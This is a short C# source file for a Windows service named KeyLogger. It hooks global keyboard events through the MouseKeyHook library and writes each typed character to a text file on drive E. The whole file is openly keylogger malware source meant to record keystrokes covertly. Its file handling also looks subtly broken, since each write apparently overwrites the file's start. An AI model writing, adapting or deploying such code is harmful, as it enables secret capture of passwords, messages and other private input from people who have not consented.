using Gma.System.MouseKeyHook;
using System.IO;
using System.ServiceProcess;
using System.Windows.Forms;

namespace KeyLogger
{
    partial class KeyLogger : ServiceBase
    {
        IKeyboardMouseEvents hook;
        protected override void OnStart(string[] args)
        {
            hook = Hook.GlobalEvents();
            hook.KeyPress += KeyPress;
        }
        protected override void OnStop()
        {
            hook.KeyPress -= KeyPress;
            hook.Dispose();
        }

        private void KeyPress(object sender, KeyPressEventArgs e)
        {
            FileStream fs = new FileStream(@"E:\keyLoggerData.txt", FileMode.OpenOrCreate, FileAccess.Write);
            StreamWriter w = new StreamWriter(fs);
            w.Write(e.KeyChar);
            w.Close();
            fs.Close();
        }
    }
}
